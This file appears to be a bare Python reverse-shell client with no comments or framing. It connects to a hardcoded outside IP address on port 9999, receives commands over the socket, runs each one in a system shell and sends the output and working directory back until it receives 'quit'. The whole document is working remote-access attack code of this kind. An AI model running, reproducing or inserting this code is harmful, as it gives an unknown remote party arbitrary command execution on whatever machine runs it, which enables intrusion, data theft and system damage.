import socket
import os
import subprocess

s = socket.socket()

host = '139.59.94.150'
port = 9999

s.connect((host,port))
print("Connection Successful....")
while True:
    data = s.recv(1024)
    if data.decode('utf-8') == 'quit':
        break
    else:
        if data[:2].decode('utf-8') == 'cd':
            os.chdir(data[3:].decode('utf-8'))
        if len(data)>0:
            cmd = subprocess.Popen(data[:].decode('utf-8'),shell= True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
            outputByte = cmd.stdout.read()+cmd.stderr.read()
            outputStr = str(outputByte,'utf-8')
            currWrkDir = os.getcwd() + ">"
            s.send(str.encode(outputStr + currWrkDir))

            print(outputStr) 
s.close()
os._exit(0)